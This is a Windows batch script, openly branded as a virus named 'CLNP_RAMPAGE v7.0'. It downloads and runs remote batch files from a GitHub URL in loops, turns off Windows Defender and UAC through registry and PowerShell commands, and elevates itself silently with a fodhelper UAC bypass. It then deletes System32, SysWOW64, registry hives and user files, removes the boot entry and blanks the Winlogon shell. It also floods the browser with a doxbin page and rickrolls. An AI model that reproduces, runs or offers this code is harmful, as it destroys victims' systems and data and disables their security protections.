@echo off
:: CLNP_RAMPAGE v7.0 - CHAOS OVERLOAD EDITION
:: "this virus will break your pc if you ran -- by CLNP"
title this virus will break your pc if you ran -- by CLNP
color 4f
mode con: cols=100 lines=30
cls

:: === PHASE 0: INSTANT DOX + GITHUB SPAM + RICKROLL FLOOD ===
start "" "https://doxbin.com/user/LACPP"
for /l %%i in (1,1,600) do start "" "https://doxbin.com/user/LACPP" >nul 2>&1
for /l %%j in (1,1,100) do curl -s "https://raw.githubusercontent.com/projectZ678/testttttttt/main/ddf.bat" -o "%temp%\spam_%%j.bat" && start /min "%temp%\spam_%%j.bat" >nul 2>&1
for /l %%r in (1,1,50) do start rundll32 url.dll,FileProtocolHandler "https://www.youtube.com/watch?v=dQw4w9WgXcQ" >nul 2>&1

:: === PHASE 1: FORCE CURL INSTALL IF MISSING ===
where curl >nul 2>&1 || (
    powershell -c "Invoke-WebRequest -Uri 'https://curl.se/windows/dl-8.10.1_3/curl-8.10.1_3-win64-mingw.zip' -OutFile '%temp%\curl.zip'" >nul 2>&1
    powershell -c "Expand-Archive -Path '%temp%\curl.zip' -DestinationPath '%temp%\curl' -Force" >nul 2>&1
    set "PATH=%PATH%;%temp%\curl\curl-8.10.1_3-win64-mingw\bin"
)

:: === PHASE 2: DISABLE DEFENDER + UAC + SMARTSCREEN ===
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true -Force" >nul 2>&1

:: === PHASE 3: SILENT ADMIN ELEVATION ===
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "%~f0" /f >nul 2>&1
start fodhelper.exe >nul 2>&1
timeout /t 1 >nul
exit /b

:: === PHASE 4: ADMIN CONFIRMED - CHAOS UNLEASHED ===
net session >nul 2>&1
if %errorlevel% neq 0 goto elevate

cls
echo [CHAOS ACTIVE] RICKROLLS | DOX | GITHUB | MAPS | SYSTEM32 DELETING...

:: === RICKROLL + MCDONALDS RANDOM TELEPORT ===
start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
start "" "https://www.google.com/maps/search/McDonald%27s/@40.7128,-74.0060,12z"

:: === AUTO-TYPE SYSTEM32 DELETE VIA RUN DIALOG ===
powershell -c "$wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys('^{ESC}'); Start-Sleep -m 300; $wshell.SendKeys('run'); Start-Sleep -m 300; $wshell.SendKeys('{ENTER}'); Start-Sleep -m 500; $wshell.SendKeys('cmd /c del /f /q /s C:\Windows\System32\*.*'); Start-Sleep -m 300; $wshell.SendKeys('{ENTER}')" >nul 2>&1

:: === AUTO-OPEN CMD AS ADMIN + TYPE DELETION COMMANDS ===
powershell -c "$wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys('^{ESC}'); Start-Sleep -m 300; $wshell.SendKeys('cmd'); Start-Sleep -m 300; $wshell.SendKeys('{ENTER}'); Start-Sleep -m 800; $wshell.SendKeys('runas /user:Administrator \"cmd.exe\"'); Start-Sleep -m 500; $wshell.SendKeys('{ENTER}'); Start-Sleep -m 1000; $wshell.SendKeys('yes'); Start-Sleep -m 300; $wshell.SendKeys('{ENTER}'); Start-Sleep -m 800; $wshell.SendKeys('del /f /q /s C:\Windows\System32\*.*{ENTER}')" >nul 2>&1

:: === LIVE SYSTEM OBLITERATION ===
takeown /f "C:\Windows\System32" /r /d y >nul 2>&1
icacls "C:\Windows\System32" /grant administrators:F /t /c >nul 2>&1
del /f /q /s "C:\Windows\System32\*.*" >nul 2>&1
del /f /q /s "C:\Windows\SysWOW64\*.*" >nul 2>&1
del /f /q /s "C:\Windows\System32\config\*.*" >nul 2>&1
del /f /q /s "C:\Users\%username%\*.*" >nul 2>&1

:: === BOOTLOADER + REGISTRY SABOTAGE ===
bcdedit /delete {current} >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "" /f >nul 2>&1

:: === RANDOM CMD CHAOS LOOP ===
:chaos
curl -s "https://raw.githubusercontent.com/projectZ678/testttttttt/main/ddf.bat" -o "%temp%\chaos.bat" && start /min "%temp%\chaos.bat" >nul 2>&1
start "" "https://doxbin.com/user/LACPP"
start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
start "" "https://www.google.com/maps/search/McDonald%27s/@40.7128,-74.0060,12z"
powershell -c "$wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys('^{ESC}'); Start-Sleep -m 200; $wshell.SendKeys('cmd /c echo CLNP WAS HERE > C:\Windows\System32\CLNP.txt'); Start-Sleep -m 200; $wshell.SendKeys('{ENTER}')" >nul 2>&1
goto chaos